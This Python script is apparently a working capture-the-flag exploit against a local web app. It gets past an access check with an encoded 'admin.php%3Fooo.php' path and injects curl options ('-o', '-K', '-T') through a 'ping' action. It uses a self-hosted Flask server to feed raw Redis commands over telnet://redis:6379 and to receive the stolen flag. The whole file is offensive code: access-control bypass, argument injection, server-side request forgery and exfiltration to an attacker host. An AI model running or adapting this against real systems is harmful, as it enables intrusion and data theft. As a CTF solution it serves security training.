#!/usr/bin/env python3
import random
import re
import threading
import time
import sys
import requests
from flask import Flask, request, Response, abort

TARGET = "http://127.0.0.1:8394"
EXPLOIT_SERVER_HOST = "host.docker.internal"
EXPLOIT_SERVER_PORT = 8000

redis_cmds = b'*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n*1\r\n$4\r\nQUIT\r\n'
captured_flag = None
app = Flask(__name__)


@app.route("/redis.dat")
def redis_dat():
    return Response(
        redis_cmds,
        mimetype="application/octet-stream",
        headers={"Content-Length": str(len(redis_cmds))},
    )


@app.route("/config_<path:rest>.txt")
def config(rest):
    if "_flag_" not in rest:
        abort(400)
    redis_file, tail = rest.rsplit("_flag_", 1)
    cfg = f'''next
url = "telnet://redis:6379"
upload-file = "{redis_file}"
output = "flag_{tail}"
no-buffer
'''
    return Response(cfg, mimetype="text/plain")


@app.route("/sink", methods=["PUT"])
def sink():
    global captured_flag
    blob = request.get_data()
    m = re.search(rb"RE:CTF\{[^}]+}", blob)
    if m:
        captured_flag = m.group().decode()
        print("FLAG:", captured_flag)
    return "OK"


def start_flask():
    app.run(
        host="0.0.0.0",
        port=EXPLOIT_SERVER_PORT,
        threaded=True,
        debug=False,
    )


def exploit_post(payload):
    url = f"{TARGET}/admin.php%3Fooo.php"
    r = requests.post(url, data=payload, timeout=8)
    r.raise_for_status()
    return r.json()


def main():
    threading.Thread(target=start_flask, daemon=True).start()
    time.sleep(0.8)

    bypass_url = f"{TARGET}/admin.php%3Fooo.php"
    acl = requests.get(bypass_url, timeout=5).text
    if "Admin Dashboard" not in acl and "TechCorp" not in acl:
        sys.exit("ACL bypass failed")

    resp = exploit_post(
        {
            "action": "ping",
            "url": f"http://{EXPLOIT_SERVER_HOST}:{EXPLOIT_SERVER_PORT}/redis.dat",
            "opt": "-o",
            "data": "POST",
        }
    )
    redis_file = resp.get("filename") or sys.exit("upload failed")

    output_file = f"flag_{''.join(random.choices('0123456789abcdef', k=12))}"
    resp = exploit_post(
        {
            "action": "ping",
            "url": f"http://{EXPLOIT_SERVER_HOST}:{EXPLOIT_SERVER_PORT}/config_{redis_file}_{output_file}.txt",
            "opt": "-o",
            "data": "GET",
        }
    )
    cfg_file = resp.get("filename") or sys.exit("config gen failed")

    exploit_post({"action": "ping", "url": "", "opt": "-K", "data": cfg_file})
    exploit_post(
        {
            "action": "ping",
            "url": f"http://{EXPLOIT_SERVER_HOST}:{EXPLOIT_SERVER_PORT}/sink",
            "opt": "-T",
            "data": output_file,
        }
    )

    time.sleep(1)
    if captured_flag:
        print("FLAG:", captured_flag)
    else:
        print("No flag captured – check /tmp", output_file)


if __name__ == "__main__":
    main()